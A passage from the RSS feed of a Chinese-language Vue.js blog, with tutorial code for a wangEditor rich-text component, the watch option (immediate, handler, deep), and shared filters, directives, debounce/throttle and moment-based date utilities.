          <span>"redo"</span><span>,</span> <span>// 重复</span>
        <span>]</span><span>;</span>

        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span>uploadImgHooks <span>=</span> <span>{</span>
          <span>fail</span><span>:</span> <span>(</span><span>xhr<span>,</span> editor<span>,</span> result</span><span>)</span> <span>=></span> <span>{</span>
            <span>// 插入图片失败回调</span>
          <span>}</span><span>,</span>
          <span>success</span><span>:</span> <span>(</span><span>xhr<span>,</span> editor<span>,</span> result</span><span>)</span> <span>=></span> <span>{</span>
            <span>// 图片上传成功回调</span>
          <span>}</span><span>,</span>
          <span>timeout</span><span>:</span> <span>(</span><span>xhr<span>,</span> editor</span><span>)</span> <span>=></span> <span>{</span>
            <span>// 网络超时的回调</span>
          <span>}</span><span>,</span>
          <span>error</span><span>:</span> <span>(</span><span>xhr<span>,</span> editor</span><span>)</span> <span>=></span> <span>{</span>
            <span>// 图片上传错误的回调</span>
          <span>}</span><span>,</span>
          <span>customInsert</span><span>:</span> <span>(</span><span>insertImg<span>,</span> result<span>,</span> editor</span><span>)</span> <span>=></span> <span>{</span>
            <span>// 图片上传成功,插入图片的回调</span>
          <span>}</span><span>,</span>
        <span>}</span><span>;</span>
        <span>this</span><span>.</span>editor<span>.</span>customConfig<span>.</span><span>onchange</span> <span>=</span> <span>(</span><span>html</span><span>)</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span>info_ <span>=</span> html<span>;</span> <span>// 绑定当前逐渐地值</span>
          <span>this</span><span>.</span><span>$emit</span><span>(</span><span>"change"</span><span>,</span> <span>this</span><span>.</span>info_<span>)</span><span>;</span> <span>// 将内容同步到父组件中</span>
        <span>}</span><span>;</span>

        <span>// 创建富文本编辑器</span>
        <span>this</span><span>.</span>editor<span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>

<span><span><span>&lt;</span>style</span> <span>lang</span><span><span>=</span><span>"</span>css<span>"</span></span><span>></span></span><span><span>
  <span>.editor</span> <span>{</span>
    <span>width</span><span>:</span> 80%<span>;</span>
    <span>margin</span><span>:</span> 0 auto<span>;</span>
  <span>}</span>

  <span>.toolbar</span> <span>{</span>
    <span>border</span><span>:</span> 1px solid #ccc<span>;</span>
  <span>}</span>

  <span>.text</span> <span>{</span>
    <span>border</span><span>:</span> 1px solid #ccc<span>;</span>
    <span>height</span><span>:</span> 500px<span>;</span>
  <span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="编辑父组件代码" tabindex="-1"> 编辑父组件代码</h3>
<div><pre><code><span><span><span>&lt;</span>template</span> <span>lang</span><span><span>=</span><span>"</span>html<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>editor-bar</span>
      <span>v-model</span><span><span>=</span><span>"</span>editor.info<span>"</span></span>
      <span>:isClear</span><span><span>=</span><span>"</span>isClear<span>"</span></span>
      <span>@change</span><span><span>=</span><span>"</span>change<span>"</span></span>
    <span>></span></span><span><span><span>&lt;/</span>editor-bar</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> EditorBar <span>from</span> <span>"@/components/EditorBar"</span><span>;</span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>editor</span><span>:</span> <span>{</span>
          <span>info</span><span>:</span> <span>""</span><span>,</span>
        <span>}</span><span>,</span>
        <span>isClear</span><span>:</span> <span>false</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>change</span><span>(</span><span>val</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>editor<span>.</span>info1 <span>=</span> val<span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>components</span><span>:</span> <span>{</span>
      EditorBar<span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>vue 中 watch 的详细用法</title>
      <link>https://vxhly.github.io/views/vuejs/usage-watch-in-vue-js.html</link>
      <guid>https://vxhly.github.io/views/vuejs/usage-watch-in-vue-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">vue 中 watch 的详细用法</source>
      <description>前言
一个对象, 键是需要观察的表达式, 值是对应回调函数。值也可以是方法名, 或者包含选项的对象。Vue 实例将会在实例化时调用 $watch(), 遍历 watch 对象的每一个属性。

</description>
      <category>vuejs</category>
      <pubDate>Wed, 30 Jan 2019 14:03:37 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>一个对象, 键是需要观察的表达式, 值是对应回调函数。值也可以是方法名, 或者包含选项的对象。Vue 实例将会在实例化时调用 $watch(), 遍历 watch 对象的每一个属性。</p>
</div>

<h2 id="api" tabindex="-1"> API</h2>
<p><a href="https://cn.vuejs.org/v2/api/#watch" target="_blank" rel="noopener noreferrer">$watch()</a></p>
<h2 id="简单的用法" tabindex="-1"> 简单的用法</h2>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>cityName</span><span>:</span> <span>"shanghai"</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>cityName</span><span>(</span><span>newName<span>,</span> oldName</span><span>)</span> <span>{</span>
        <span>// ...</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>或者</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>cityName</span><span>:</span> <span>"shanghai"</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>cityName</span><span>:</span> <span>"nameChange"</span><span>,</span>
    <span>}</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>nameChange</span><span>(</span><span>newName<span>,</span> oldName</span><span>)</span> <span>{</span>
        <span>// ...</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="immediate-和-handler" tabindex="-1"> immediate 和 handler</h2>
<p>这样使用 watch 时有一个特点, 就是当值第一次绑定的时候, 不会执行监听函数, 只有值发生改变才会执行。如果我们需要在最初绑定值的时候也执行函数, 则就需要用到 immediate 属性。</p>
<p>比如当父组件向子组件动态传值时, 子组件 props 首次获取到父组件传来的默认值时, 也需要执行函数, 此时就需要将 immediate 设为 true。</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>cityName</span><span>:</span> <span>"shanghai"</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>cityName</span><span>(</span><span>newName<span>,</span> oldName</span><span>)</span> <span>{</span>
        <span>// ...</span>
      <span>}</span><span>,</span>
      <span>immediate</span><span>:</span> <span>true</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>监听的数据后面写成对象形式, 包含 handler 方法和 immediate, 之前我们写的函数其实就是在写这个 handler 方法；</p>
<p>immediate 表示在 watch 中首次绑定的时候, 是否执行 handler, 值为 <code>true</code> 则表示在 watch 中声明的时候, 就立即执行 handler 方法, 值为 false, 则和一般使用 watch 一样, 在数据发生变化的时候才执行 handler。</p>
<h2 id="deep" tabindex="-1"> deep</h2>
<p>当需要监听一个对象的改变时, 普通的 watch 方法无法监听到对象内部属性的改变, 只有 data 中的数据才能够监听到变化, 此时就需要 deep 属性对对象进行深度监听。</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>cityName</span><span>:</span> <span>{</span>
          <span>id</span><span>:</span> <span>1</span><span>,</span>
          <span>name</span><span>:</span> <span>"shanghai"</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>cityName</span><span>:</span> <span>{</span>
        <span>handler</span><span>(</span><span>newName<span>,</span> oldName</span><span>)</span> <span>{</span>
          <span>// ...</span>
        <span>}</span><span>,</span>
        <span>deep</span><span>:</span> <span>true</span><span>,</span>
        <span>immediate</span><span>:</span> <span>true</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>设置 deep: true 则可以监听到 cityName.name 的变化, 此时会给 cityName 的所有属性都加上这个监听器, 当对象属性较多时, 每个属性值的变化都会执行 handler。如果只需要监听对象中的一个属性值, 则可以做以下优化: 使用字符串的形式监听对象属性:</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>cityName</span><span>:</span> <span>{</span>
          <span>id</span><span>:</span> <span>1</span><span>,</span>
          <span>name</span><span>:</span> <span>"shanghai"</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>"cityName.name"</span><span>:</span> <span>{</span>
        <span>handler</span><span>(</span><span>newName<span>,</span> oldName</span><span>)</span> <span>{</span>
          <span>// ...</span>
        <span>}</span><span>,</span>
        <span>deep</span><span>:</span> <span>true</span><span>,</span>
        <span>immediate</span><span>:</span> <span>true</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue.js 中的实用工具方法</title>
      <link>https://vxhly.github.io/views/vuejs/utility-method-in-vue-js.html</link>
      <guid>https://vxhly.github.io/views/vuejs/utility-method-in-vue-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Vue.js 中的实用工具方法</source>
      <description>前言
收集日常开发中常用到的一些工具方法, 包含 vue 的公用过滤器、公用指令等 (PS: 懒人养成记)。

</description>
      <category>vuejs</category>
      <pubDate>Thu, 04 Jul 2019 11:35:57 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>收集日常开发中常用到的一些工具方法, 包含 vue 的公用过滤器、公用指令等 (PS: 懒人养成记)。</p>
</div>

<h2 id="公用自定义过滤器" tabindex="-1"> 公用自定义过滤器</h2>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> moment <span>from</span> <span>"moment"</span><span>;</span>

<span>/**
 * <span>@filter</span> dateFormat 时间格式化
 * <span>@param</span> <span><span>{</span>String<span>,</span> Date<span>}</span></span> <span>value</span> 可被 new Date 解析的字符串
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>formatStr</span> moment 的 format 字符串
 * 使用方法 <span>{</span><span>{</span> 2019-1-1 | dateFormat() <span>}</span><span>}</span>
 */</span>
Vue<span>.</span><span>filter</span><span>(</span><span>"dateFormat"</span><span>,</span> <span>(</span><span>value<span>,</span> formatStr</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>moment</span><span>(</span>value<span>)</span><span>.</span><span>format</span><span>(</span>formatStr <span>||</span> <span>"YYYY年MM月DD日 hh:mm:ss"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>/**
 * <span>@filter</span> digitUppercase 人民币金额转成汉字大写
 * <span>@param</span> <span><span>{</span>Number<span>}</span></span> <span>value</span> 金额数字
 * 使用方法 <span>{</span><span>{</span> 1111 | digitUppercase <span>}</span><span>}</span>
 */</span>
Vue<span>.</span><span>filter</span><span>(</span><span>"digitUppercase"</span><span>,</span> <span>(</span><span>value</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span><span>Number</span><span>(</span>value<span>)</span><span>)</span> <span>{</span>
    <span>let</span> fraction <span>=</span> <span>[</span><span>"角"</span><span>,</span> <span>"分"</span><span>]</span><span>;</span>
    <span>let</span> digit <span>=</span> <span>[</span><span>"零"</span><span>,</span> <span>"壹"</span><span>,</span> <span>"贰"</span><span>,</span> <span>"叁"</span><span>,</span> <span>"肆"</span><span>,</span> <span>"伍"</span><span>,</span> <span>"陆"</span><span>,</span> <span>"柒"</span><span>,</span> <span>"捌"</span><span>,</span> <span>"玖"</span><span>]</span><span>;</span>
    <span>let</span> unit <span>=</span> <span>[</span>
      <span>[</span><span>"元"</span><span>,</span> <span>"万"</span><span>,</span> <span>"亿"</span><span>]</span><span>,</span>
      <span>[</span><span>""</span><span>,</span> <span>"拾"</span><span>,</span> <span>"佰"</span><span>,</span> <span>"仟"</span><span>]</span><span>,</span>
    <span>]</span><span>;</span>

    <span>let</span> head <span>=</span> value <span>&lt;</span> <span>0</span> <span>?</span> <span>"欠"</span> <span>:</span> <span>""</span><span>;</span>
    value <span>=</span> Math<span>.</span><span>abs</span><span>(</span>value<span>)</span><span>;</span>
    <span>let</span> s <span>=</span> <span>""</span><span>;</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> fraction<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      s <span>+=</span> <span>(</span>
        digit<span>[</span>Math<span>.</span><span>floor</span><span>(</span>value <span>*</span> <span>10</span> <span>*</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> i<span>)</span><span>)</span> <span>%</span> <span>10</span><span>]</span> <span>+</span> fraction<span>[</span>i<span>]</span>
      <span>)</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>零.</span><span>/</span></span><span>,</span> <span>""</span><span>)</span><span>;</span>
    <span>}</span>
    s <span>=</span> s <span>||</span> <span>"整"</span><span>;</span>
    value <span>=</span> Math<span>.</span><span>floor</span><span>(</span>value<span>)</span><span>;</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> unit<span>[</span><span>0</span><span>]</span><span>.</span>length <span>&amp;&amp;</span> value <span>></span> <span>0</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>let</span> p <span>=</span> <span>""</span><span>;</span>
      <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>0</span><span>;</span> j <span>&lt;</span> unit<span>[</span><span>1</span><span>]</span><span>.</span>length <span>&amp;&amp;</span> value <span>></span> <span>0</span><span>;</span> j<span>++</span><span>)</span> <span>{</span>
        p <span>=</span> digit<span>[</span>value <span>%</span> <span>10</span><span>]</span> <span>+</span> unit<span>[</span><span>1</span><span>]</span><span>[</span>j<span>]</span> <span>+</span> p<span>;</span>
        value <span>=</span> Math<span>.</span><span>floor</span><span>(</span>value <span>/</span> <span>10</span><span>)</span><span>;</span>
      <span>}</span>
      s <span>=</span> p<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(零.)*零$</span><span>/</span></span><span>,</span> <span>""</span><span>)</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^$</span><span>/</span></span><span>,</span> <span>"零"</span><span>)</span> <span>+</span> unit<span>[</span><span>0</span><span>]</span><span>[</span>i<span>]</span> <span>+</span> s<span>;</span>
    <span>}</span>
    <span>return</span> <span>(</span>
      head <span>+</span>
      s
        <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(零.)*零元</span><span>/</span></span><span>,</span> <span>"元"</span><span>)</span>
        <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(零.)+</span><span>/</span><span>g</span></span><span>,</span> <span>"零"</span><span>)</span>
        <span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^整$</span><span>/</span></span><span>,</span> <span>"零元整"</span><span>)</span>
    <span>)</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>"零元整"</span><span>;</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="公用自定义指令" tabindex="-1"> 公用自定义指令</h2>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>

<span>/**
 * <span>@directive</span> preventReClick 防止按钮在短时间内多次点击造成的多次请求(一般用于提交按钮)
 * <span>@param</span> <span><span>{</span>Element<span>}</span></span> <span>el</span> 绑定的元素
 * <span>@param</span> <span><span>{</span>Number<span>}</span></span> <span>binding</span> 绑定的时间
 * 使用方式 &lt;el-buttonvent-replace-click>&lt;/el-button>
 */</span>
Vue<span>.</span><span>directive</span><span>(</span><span>"preventReplaceClick"</span><span>,</span> <span>{</span>
  <span>inserted</span><span>(</span><span>el<span>,</span> binding</span><span>)</span> <span>{</span>
    el<span>.</span><span>addEventListener</span><span>(</span><span>"click"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span><span>!</span>el<span>.</span>disabled<span>)</span> <span>{</span>
        el<span>.</span>classList<span>.</span><span>add</span><span>(</span><span>"is-disabled"</span><span>)</span><span>;</span>
        <span>const</span> i <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"i"</span><span>)</span><span>;</span>
        i<span>.</span>classList<span>.</span><span>add</span><span>(</span><span>"el-icon-loading"</span><span>)</span><span>;</span>
        el<span>.</span><span>prepend</span><span>(</span>i<span>)</span><span>;</span>
        el<span>.</span>classList<span>.</span><span>add</span><span>(</span><span>"is-loading"</span><span>)</span><span>;</span>
        el<span>.</span>disabled <span>=</span> <span>true</span><span>;</span>

        <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
          el<span>.</span>disabled <span>=</span> <span>false</span><span>;</span>
          el<span>.</span>classList<span>.</span><span>remove</span><span>(</span><span>"is-disabled"</span><span>)</span><span>;</span>
          el<span>.</span>classList<span>.</span><span>remove</span><span>(</span><span>"is-loading"</span><span>)</span><span>;</span>
          el<span>.</span><span>removeChild</span><span>(</span>i<span>)</span><span>;</span>
        <span>}</span><span>,</span> binding<span>.</span>value <span>||</span> <span>1000</span><span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="实用方法" tabindex="-1"> 实用方法</h2>
<h3 id="节流和防抖" tabindex="-1"> 节流和防抖</h3>
<div><pre><code><span>/**
 * 应用场景
 * debounce(抖动)
 * search搜索联想, 用户在不断输入值时, 用防抖来节约请求资源。
 * window触发resize的时候, 不断的调整浏览器窗口大小会不断的触发这个事件, 用防抖来让其只触发一次
 *
 * throttle(节流)
 * 鼠标不断点击触发, mousedown(单位时间内只触发一次)
 * 监听滚动事件, 比如是否滑到底部自动加载更多, 用throttle来判断
 */</span>

<span>// 防抖</span>
<span>export</span> <span>function</span> <span>debounce</span><span>(</span><span>fn<span>,</span> delay <span>=</span> <span>200</span></span><span>)</span> <span>{</span>
  <span>let</span> timer<span>;</span>
  <span>return</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>let</span> th <span>=</span> <span>this</span><span>;</span>
    <span>let</span> args <span>=</span> arguments<span>;</span>
    <span>if</span> <span>(</span>timer<span>)</span> <span>{</span>
      <span>clearTimeout</span><span>(</span>timer<span>)</span><span>;</span>
    <span>}</span>
    timer <span>=</span> <span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
      timer <span>=</span> <span>null</span><span>;</span>
      <span>fn</span><span>.</span><span>apply</span><span>(</span>th<span>,</span> args<span>)</span><span>;</span>
    <span>}</span><span>,</span> delay<span>)</span><span>;</span>
  <span>}</span><span>;</span>
<span>}</span>
<span>// 节流</span>
<span>export</span> <span>function</span> <span>throttle</span><span>(</span><span>fn<span>,</span> interval <span>=</span> <span>200</span></span><span>)</span> <span>{</span>
  <span>let</span> last<span>;</span>
  <span>let</span> timer<span>;</span>
  <span>return</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>let</span> th <span>=</span> <span>this</span><span>;</span>
    <span>let</span> args <span>=</span> arguments<span>;</span>
    <span>let</span> now <span>=</span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>;</span>
    <span>if</span> <span>(</span>last <span>&amp;&amp;</span> now <span>-</span> last <span>&lt;</span> interval<span>)</span> <span>{</span>
      <span>clearTimeout</span><span>(</span>timer<span>)</span><span>;</span>
      timer <span>=</span> <span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
        last <span>=</span> now<span>;</span>
        <span>fn</span><span>.</span><span>apply</span><span>(</span>th<span>,</span> args<span>)</span><span>;</span>
      <span>}</span><span>,</span> interval<span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      last <span>=</span> now<span>;</span>
      <span>fn</span><span>.</span><span>apply</span><span>(</span>th<span>,</span> args<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="时间格式化处理" tabindex="-1"> 时间格式化处理</h3>
<div><pre><code><span>// 时间格式化成 startDate 和 endDate</span>
<span>import</span> moment <span>from</span> <span>"moment"</span><span>;</span>
<span>import</span> _ <span>from</span> <span>"lodash"</span><span>;</span>

<span>/**
 * <span>@method</span> timerByAdd 计算相对当前时间后N个单位时间的日期(加法)
 * <span>@param</span> <span>num</span> <span>{</span>Number<span>}</span> 相对于几个时间点
 * <span>@param</span> <span>timer</span> <span>{</span>String<span>}</span> 时间单位 'days' 'months' 'years‘ 更多时间单位参考moment官方文档
 * <span>@param</span> <span>formatStr</span> <span>{</span>String<span>}</span> moment 的 format 字符串
 * <span>@return</span> <span><span>{</span>Object<span>}</span></span> <span>{</span>startDate,endDate<span>}</span>
 */</span>
<span>export</span> <span>function</span> <span>timerByAdd</span><span>(</span>
  <span>{</span> num<span>,</span> timer <span>=</span> <span>"days"</span> <span>}</span> <span>=</span> <span>{</span><span>}</span><span>,</span>
  formatStr <span>=</span> <span>"YYYY-MM-DD"</span>
<span>)</span> <span>{</span>
  <span>let</span> startDate <span>=</span> <span>moment</span><span>(</span><span>)</span><span>.</span><span>format</span><span>(</span>formatStr<span>)</span><span>;</span>
  <span>let</span> endDate<span>;</span>

  num
    <span>?</span> <span>(</span>endDate <span>=</span> <span>moment</span><span>(</span><span>)</span><span>.</span><span>add</span><span>(</span>num<span>,</span> timer<span>)</span><span>.</span><span>format</span><span>(</span>formatStr<span>)</span><span>)</span>
    <span>:</span> <span>(</span>startDate <span>=</span> endDate<span>)</span><span>;</span>

  endDate <span>=</span> <span>moment</span><span>(</span>endDate<span>)</span><span>.</span><span>subtract</span><span>(</span><span>1</span><span>,</span> <span>"days"</span><span>)</span><span>.</span><span>format</span><span>(</span>formatStr<span>)</span><span>;</span>

  <span>let</span> result <span>=</span> <span>{</span>
    startDate<span>,</span>
    endDate<span>,</span>
  <span>}</span><span>;</span>
  <span>return</span> result<span>;</span>
<span>}</span>

<span>/**
 * <span>@method</span> timerBySubtract 计算相对当前时间前N个单位时间的日期(减法)
 * <span>@param</span> <span>num</span> <span>{</span>Number<span>}</span> 相对于几个时间点
 * <span>@param</span> <span>timer</span> <span>{</span>String<span>}</span> 时间单位 'days' 'months' 'years‘ 更多时间单位参考moment官方文档
 * <span>@param</span> <span>formatStr</span> <span>{</span>String<span>}</span> moment 的 format 字符串
 * <span>@return</span> <span><span>{</span>Object<span>}</span></span> <span>{</span>startDate,endDate<span>}</span>
 */</span>
<span>export</span> <span>function</span> <span>timerBySubtract</span><span>(</span>
  <span>{</span> num<span>,</span> timer <span>=</span> <span>"days"</span> <span>}</span> <span>=</span> <span>{</span><span>}</span><span>,</span>
  formatStr <span>=</span> <span>"YYYY-MM-DD"</span>
<span>)</span> <span>{</span>
  <span>let</span> startDate<span>;</span>
  <span>let</span> endDate <span>=</span> <span>moment</span><span>(</span><span>)</span><span>.</span><span>format</span><span>(</span>formatStr<span>)</span><span>;</span>

  num
    <span>?</span> <span>(</span>startDate <span>=</span> <span>moment</span><span>(</span><span>)</span><span>.</span><span>subtract</span><span>(</span>num<span>,</span> timer<span>)</span><span>.</span><span>format</span><span>(</span>formatStr<span>)</span><span>)</span>
    <span>:</span> <span>(</span>startDate <span>=</span> endDate<span>)</span><span>;</span>

  <span>let</span> result <span>=</span> <span>{</span>
    startDate<span>,</span>
    endDate<span>,</span>
  <span>}</span><span>;</span>
  <span>return</span> result<span>;</span>
<span>}</span>

<span>/**
 * <span>@method</span> timerFormat 将对象时间转成数组形式
 * <span>@param</span> <span><span>{</span>Object<span>}</span></span> <span>timer</span> <span>{</span>startDate, endDate<span>}</span>
 */</span>
<span>export</span> <span>function</span> <span>timerFormat</span><span>(</span><span>timer</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>_<span>.</span><span>isObject</span><span>(</span>timer<span>)</span><span>)</span> <span>{</span>
    <span>return</span> _<span>.</span><span>values</span><span>(</span>timer<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>/**
 * <span>@method</span> timerByDiff 计算两个时间段的相差天数,精确到 N 年 N 天 精确到小数后两位
 * <span>@param</span> <span><span>{</span>Date<span>}</span></span> <span>startDate</span> 开始时间
 * <span>@param</span> <span><span>{</span>Date<span>}</span></span> <span>endDate</span> 结束时间
 */</span>
<span>export</span> <span>function</span> <span>timerByDiff</span><span>(</span><span>startDate<span>,</span> endDate</span><span>)</span> <span>{</span>
